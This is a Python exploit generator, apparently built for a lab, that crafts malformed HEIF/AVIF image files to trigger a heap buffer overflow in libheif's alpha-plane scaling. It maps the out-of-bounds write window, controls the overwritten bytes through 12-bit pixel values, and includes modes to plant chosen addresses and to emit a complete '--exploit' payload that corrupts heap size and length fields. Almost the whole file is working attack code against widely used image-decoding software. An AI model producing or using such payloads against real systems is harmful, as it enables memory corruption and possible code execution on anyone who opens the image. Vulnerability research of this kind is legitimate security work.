#!/usr/bin/env python3
"""
Exploit payload generator for the libheif duplicate-Alpha overflow
(GHSA-g89c-p67h-r497), lab variant.

Item graph (all HEVC, decoded with libde265; 4:2:0 needs even dims):

  item1  hvc1 126x126 8-bit   (color, alpha aux -> item2)
  item2  hvc1 126x126 8-bit   (alpha aux of item1)
  item3  iden -> item1        (alpha aux of item5, own alpha -> item4)
  item4  hvc1 126x126 12-bit  (alpha aux of item3, pixel values = our pattern)
  item5  hvc1 128x128 8-bit   (primary)

Because item4 is 126x126 (= item3's dims), the 12-bit alpha is NOT rescaled
inside item3.  When item5 attaches item3's image as alpha, scale 126->128
runs: the destination alpha plane is allocated with the FIRST alpha's depth
(8 bit -> 128*128 = 16384 bytes) but the 12-bit alpha plane takes the HDR
branch and writes 128*128*2 bytes -> 16384 bytes overflow.

Window mapping (write position p = y*128 + x, y in [64,128), x in [0,128)):
  value(p) = P[y - ceil(y/64)][x - ceil(x/64)]
  i.e. cols (0,1) and (64,65) and rows (64,65) duplicate; all other units
  are distinct source pixels.

The 12-bit samples are written as 16-bit words; on the wire each u16 V must
have its low nibble == 0, so an 8-byte target field placed at even window
offset is constrained to addresses whose bytes 0,2,4,6 have low nibble 0
("even family"); at odd offset it constrains bytes 1,3,5,7 ("odd family").

Modes:
  --calib              pattern P[y][x] = (y*256 + x) & 0xFFF, for mapping
                       calibration (use harness mode 2 and compare dumps)
  --addr 0xHEX         write the 8-byte value at window offset 16+OFP
                       (OFP=32 -> units 24..27, even family), zeros elsewhere
  --rawshift {4,0}     how rawvideo words map to written u16 words
                       (4 = left-aligned: written = raw << 4, the libde265
                       convention; set from calibration output)
"""

import struct, subprocess, tempfile, os, io, sys

OFP = 32          # must match harness.c
D1, D4, D5 = 126, 126, 128

class BitReader:
    def __init__(self, data):
        self.data = data
        self.pos = 0

    def get(self, n):
        v = 0
        for _ in range(n):
            byte = self.data[self.pos // 8]
            bit = (byte >> (7 - self.pos % 8)) & 1
            v = (v << 1) | bit
            self.pos += 1
        return v

def _read_leb(data, p):
    v = 0
    shift = 0
    while True:
        b = data[p]
        p += 1
        v |= (b & 0x7F) << shift
        if not (b & 0x80):
            break
        shift += 7
    return v, p

def _generate_hevc_lavfi(w, h, pix_fmt):
    fd, path = tempfile.mkstemp(suffix=".265")
    os.close(fd)
    try:
        subprocess.run([
            "ffmpeg", "-y", "-f", "lavfi",
            "-i", f"color=c=gray:s={w}x{h}",
            "-frames:v", "1", "-c:v", "libx265",
            "-x265-params", "log-level=0",
            "-pix_fmt", pix_fmt, "-f", "hevc", path,
        ], capture_output=True, check=True)
        with open(path, "rb") as f:
            return f.read()
    finally:
        os.unlink(path)

def _generate_hevc_raw12(w, h, rawvideo):
    fd, path = tempfile.mkstemp(suffix=".265")
    os.close(fd)
    rawfd, rawpath = tempfile.mkstemp(suffix=".bin")
    os.write(rawfd, rawvideo)
    os.close(rawfd)
    try:
        subprocess.run([
            "ffmpeg", "-y", "-f", "rawvideo",
            "-pix_fmt", "yuv420p12le", "-s", f"{w}x{h}", "-i", rawpath,
            "-frames:v", "1", "-c:v", "libx265",
            "-x265-params", "lossless=1:log-level=0",
            "-pix_fmt", "yuv420p12le", "-f", "hevc", path,
        ], capture_output=True, check=True)
        with open(path, "rb") as f:
            return f.read()
    finally:
        os.unlink(path)
        os.unlink(rawpath)

def _parse_annex_b(data):
    nalus, i = [], 0
    while i < len(data):
        if data[i:i+4] == b"\x00\x00\x00\x01":
            start = i + 4
        elif data[i:i+3] == b"\x00\x00\x01":
            start = i + 3
        else:
            i += 1
            continue
        end = len(data)
        j = start
        while j < len(data) - 3:
            if data[j:j+3] == b"\x00\x00\x01":
                end = j
                while end > start and data[end - 1] == 0:
                    end -= 1
                break
            j += 1
        nalus.append(data[start:end])
        i = end
    return nalus

def _nal_type(n):
    return (n[0] >> 1) & 0x3F

def _split_nalus(raw):
    ps = {"vps": [], "sps": [], "pps": []}
    vcl = []
    for n in _parse_annex_b(raw):
        t = _nal_type(n)
        if t == 32:
            ps["vps"].append(n)
        elif t == 33:
            ps["sps"].append(n)
        elif t == 34:
            ps["pps"].append(n)
        elif t <= 31:
            vcl.append(n)
    return ps, vcl

def _box(tag, p=b""):
    return struct.pack(">I", 8 + len(p)) + tag + p

def _fullbox(tag, ver, flags, p=b""):
    return _box(tag, struct.pack(">I", (ver << 24) | flags) + p)

def _len_prefix(n):
    return struct.pack(">I", len(n)) + n

def _build_hvcc(ps, bpp, chroma):
    sps = ps["sps"][0]
    pb = sps[2] if len(sps) > 2 else 0
    buf = io.BytesIO()
    buf.write(struct.pack("B", 1))
    buf.write(struct.pack("B", ((pb >> 6) & 3) << 6 | ((pb >> 5) & 1) << 5 | (pb & 0x1F)))
    buf.write(b"\x60\x00\x00\x00")
    buf.write(b"\x90\x00\x00\x00\x00\x00")
    buf.write(struct.pack("B", 93))
    buf.write(struct.pack(">H", 0xF000))
    buf.write(struct.pack("B", 0xFC))
    buf.write(struct.pack("B", 0xFC | (chroma & 3)))
    buf.write(struct.pack("B", 0xF8 | ((bpp - 8) & 7)))
    buf.write(struct.pack("B", 0xF8 | ((bpp - 8) & 7)))
    buf.write(struct.pack(">H", 0))
    buf.write(struct.pack("B", 0x0F))
    arrays = []
    for nt, k in [(32, "vps"), (33, "sps"), (34, "pps")]:
        if ps[k]:
            hdr = struct.pack("B", 0x80 | nt) + struct.pack(">H", len(ps[k]))
            body = b"".join(struct.pack(">H", len(n)) + n for n in ps[k])
            arrays.append(hdr + body)
    buf.write(struct.pack("B", len(arrays)))
    for a in arrays:
        buf.write(a)
    return _box(b"hvcC", buf.getvalue())

def build_payload(pattern, rawshift=4):
    assert rawshift in (0, 4)

    print("[*] generating 8-bit 126x126 ...")
    raw1 = _generate_hevc_lavfi(126, 126, "yuv420p")
    print("[*] generating 8-bit 128x128 ...")
    raw5 = _generate_hevc_lavfi(128, 128, "yuv420p")

    # 12-bit rawvideo: Y plane carries the pattern
    y = bytearray()
    for iy in range(126):
        for ix in range(126):
            v = pattern[iy][ix] & 0xFFF
            w = (v << rawshift) if rawshift else v
            y += struct.pack("<H", w & 0xFFFF)
    uv = bytes(63 * 63 * 2)
    raw12 = bytes(y) + uv + uv
    print("[*] generating 12-bit 126x126 (lossless) ...")
    raw4 = _generate_hevc_raw12(126, 126, raw12)

    ps1, vcl1 = _split_nalus(raw1)
    ps4, vcl4 = _split_nalus(raw4)
    ps5, vcl5 = _split_nalus(raw5)

    d1 = b"".join(_len_prefix(n) for n in vcl1)
    d2 = d1
    d4 = b"".join(_len_prefix(n) for n in vcl4)
    d5 = b"".join(_len_prefix(n) for n in vcl5)

    ftyp = _box(b"ftyp", b"heic" + struct.pack(">I", 0) + b"heicmif1miaf")
    mdat = _box(b"mdat", d1 + d2 + d4 + d5)
    base = len(ftyp) + 8
    o1 = base
    o2 = o1 + len(d1)
    o4 = o2 + len(d2)
    o5 = o4 + len(d4)

    hdlr = _fullbox(b"hdlr", 0, 0, struct.pack(">I", 0) + b"pict" + b"\x00" * 12 + b"\x00")
    pitm = _fullbox(b"pitm", 0, 0, struct.pack(">H", 5))

    def infe(iid, typ):
        return _fullbox(b"infe", 2, 0, struct.pack(">HH", iid, 0) + typ + b"\x00")
    iinf = _fullbox(b"iinf", 0, 0, struct.pack(">H", 5) +
        infe(1, b"hvc1") + infe(2, b"hvc1") + infe(3, b"iden") +
        infe(4, b"hvc1") + infe(5, b"hvc1"))

    def sref(rt, fi, tl):
        return _box(rt, struct.pack(">HH", fi, len(tl)) +
            b"".join(struct.pack(">H", t) for t in tl))
    iref = _fullbox(b"iref", 0, 0,
        sref(b"auxl", 2, [1]) + sref(b"dimg", 3, [1]) +
        sref(b"auxl", 3, [5]) + sref(b"auxl", 4, [3]))

    ispe127 = _fullbox(b"ispe", 0, 0, struct.pack(">II", 126, 126))
    ispe128 = _fullbox(b"ispe", 0, 0, struct.pack(">II", 128, 128))
    hc8 = _build_hvcc(ps1, 8, 1)
    hc12 = _build_hvcc(ps4, 12, 1)
    hc8_128 = _build_hvcc(ps5, 8, 1)
    auxc = _fullbox(b"auxC", 0, 0,
        b"urn:mpeg:mpegB:cicp:systems:auxiliary:alpha\x00")
    ipco = _box(b"ipco", ispe127 + ispe128 + hc8 + hc12 + hc8_128 + auxc)

    def ipma_e(iid, al):
        return struct.pack(">HB", iid, len(al)) + \
            b"".join(struct.pack("B", ((1 if e else 0) << 7) | (i & 0x7F))
                     for e, i in al)
    ipma = _fullbox(b"ipma", 0, 0, struct.pack(">I", 5) +
        ipma_e(1, [(1,1),(1,3)]) +
        ipma_e(2, [(1,1),(1,3),(1,6)]) +
        ipma_e(3, [(1,1),(1,6)]) +
        ipma_e(4, [(1,1),(1,4),(1,6)]) +
        ipma_e(5, [(1,2),(1,5)]))
    iprp = _box(b"iprp", ipco + ipma)

    def iloc_i(iid, off, ln):
        return struct.pack(">HHHII", iid, 0, 1, off, ln)
    def iloc_e(iid):
        return struct.pack(">HHH", iid, 0, 0)
    iloc = _fullbox(b"iloc", 0, 0,
        struct.pack("BB", 0x44, 0x00) + struct.pack(">H", 5) +
        iloc_i(1, o1, len(d1)) + iloc_i(2, o2, len(d2)) +
        iloc_e(3) + iloc_i(4, o4, len(d4)) + iloc_i(5, o5, len(d5)))

    meta = _fullbox(b"meta", 0, 0, hdlr + pitm + iinf + iref + iprp + iloc)
    return ftyp + mdat + meta

def main():
    args = sys.argv[1:]
    sets = {}          # window unit -> 12-bit value
    addr = None
    i = 0
    while i < len(args):
        if args[i] == "--set":
            u, v = args[i+1].split(":")
            sets[int(u)] = int(v, 0) & 0xFFF
            i += 2
        elif args[i] == "--addr":
            addr = int(args[i+1], 16)
            i += 2
        else:
            i += 1

    # write-mapping: window byte o (offset from target chunk header) is
    # produced by the HDR-branch write at unit p (write index y*64+x) of the
    # 128x128 output; the final write of every unit in the OOB window comes
    # from row y=127 (out_stride/2 = 64 uint16 per row, x in [0,128)):
    #   unit p -> (y=127, x=p-8128) -> source P[125][floor(126*x/128)]
    # storage: written u16 = value << 4 (libde265 left-aligned, calibrated)
    def unit_ix(p):
        x = p - 8128
        return (126 * x) // 128

    pattern = [[0] * 126 for _ in range(126)]

    def put_byte(o, b):
        u = (16399 + o) // 2
        pos = (16399 + o) % 2
        ix = unit_ix(u)
        v = pattern[125][ix]
        if pos == 1:      # high byte of unit: full 8-bit control
            v = (v & 0xF) | ((b & 0xFF) << 4)
        else:             # low byte: value = (v&0xF)<<4, low nibble forced 0
            assert (b & 0xF) == 0, "byte %02x at window offset %d not writable" % (b, o)
            v = (v & 0xFF0) | (b >> 4)
        pattern[125][ix] = v
        print("[*] window[%3d]=%02x -> unit %d -> P[125][%d] = 0x%03x" % (o, b, u, ix, v))

    if "--calib" in args:
        pattern = [[(y * 256 + x) & 0xFFF for x in range(126)] for y in range(126)]
        payload = build_payload(pattern, rawshift=0)
        with open("payload-calib.avif", "wb") as f:
            f.write(payload)
        print("[+] written payload-calib.avif", len(payload), "bytes")
        return

    if "--exploit" in args:
        # size field (window bytes 9..16 -> units 8204..8207): 0x0101
        # len field  (window bytes 49..52 -> units 8224..8225): 0x0F00
        for u, v in ((8203, 0x000), (8204, 0x101), (8205, 0x000),
                     (8206, 0x000), (8207, 0x000),
                     (8223, 0x000), (8224, 0xF00), (8225, 0x000)):
            ix = unit_ix(u)
            pattern[125][ix] = v
            print("[*] set unit %d -> P[125][%d] = 0x%03x" % (u, ix, v))
        out = "payload-exploit.avif"
    elif sets:
        for u, v in sets.items():
            ix = unit_ix(u)
            pattern[125][ix] = v
            print("[*] set unit %d -> P[125][%d] = 0x%03x" % (u, ix, v))
        out = "payload-set.avif"
    elif addr is not None:
        b = addr.to_bytes(8, "little")
        for k in range(8):
            put_byte(16 + OFP + k, b[k])
        out = "payload-addr.avif"
    else:
        print(__doc__)
        sys.exit(1)

    payload = build_payload(pattern, rawshift=0)
    with open(out, "wb") as f:
        f.write(payload)
    print("[+] written", out, len(payload), "bytes")


if __name__ == "__main__":
    main()
